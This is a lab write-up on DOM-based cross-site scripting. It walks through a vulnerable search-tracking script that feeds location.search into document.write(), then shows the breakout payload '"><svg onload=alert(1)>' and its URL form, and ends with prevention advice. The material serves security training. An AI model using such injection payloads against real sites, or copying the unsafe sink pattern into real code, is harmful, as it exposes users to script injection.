# Lab 03: DOM XSS in document.write sink using source location.search

**Goal**: Perform a DOM-based cross-site scripting (DOM XSS) attack that breaks out of an `img` attribute context and calls the `alert()` function.

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking script. The application reads user input from `location.search` (source) and passes it directly into the unsafe JavaScript `document.write()` function (sink) without sanitization, embedding it within an `<img>` tag `src` attribute.

---

## 🎯 Solution

1. Test the search field with a random alphanumeric string (e.g. `test123`) to identify how the input is reflected.
2. Inspect the DOM element to observe that the input is placed inside an `img` tag's `src` attribute:
   ```html
   <img src="/resources/images/tracker.gif?searchTerms=test123">
   ```
3. Break out of the `<img>` tag and inject an event handler payload:
   ```html
   "><svg onload=alert(1)>
   ```
4. Submit the search payload to trigger `alert(1)`.

![Lab 3 Inspect DOM Sink](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-25%20185529.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Probe Search Input
Enter a random alphanumeric string (e.g., `test123`) into the search box and press Search.

### Step 2: Inspect DOM Element & Source/Sink Analysis
Right-click on the page and select **Inspect Element** (or press F12). Locate the inline client-side JavaScript that tracks search queries:

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if (query) {
    trackSearch(query);
}
```

- **Source**: `location.search` (`window.location.search` query string)
- **Sink**: `document.write()`

The search term is written directly into an `<img src="...">` attribute without escaping quotes (`"`) or tag delimiters (`>`).

### Step 3: Craft and Inject Payload
To break out of the `src="..."` attribute and the `<img>` tag itself, construct a payload starting with `">`:

```html
"><svg onload=alert(1)>
```

Submit this payload in the search field or append it to the URL query string:
```http
/?search="><svg onload=alert(1)>
```

### Step 4: Verify Payload Execution
When `document.write()` executes, the DOM structure is transformed into:

```html
<img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)">
```

The browser encounters the `<svg>` element and immediately executes `alert(1)` via the `onload` event listener:

![Lab 3 Solved Alert](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-25%20190357.png)

> [!SUCCESS]
> **Lab Solved**: Successfully executed `alert(1)` via DOM XSS in `document.write`!

---

## 💡 Key Takeaways: DOM XSS Mechanics

- **Client-Side Execution**: DOM XSS occurs entirely on the client side when JavaScript dynamically manipulates page content using unsafe sources and sinks.
- **Source**: An API or property that accepts attacker-controllable data (`location.search`, `location.hash`, `document.referrer`).
- **Sink**: A function or DOM object that can execute code or render HTML if given raw input (`document.write()`, `innerHTML`, `eval()`).

---

## 🔒 Prevention

> [!TIP]
> 1. **Avoid Unsafe Sinks**: Do not use `document.write()` to render dynamic data.
> 2. **Use Safe DOM APIs**: Use safe methods such as `textContent` or `element.setAttribute()` instead of concatenating raw strings into HTML context.
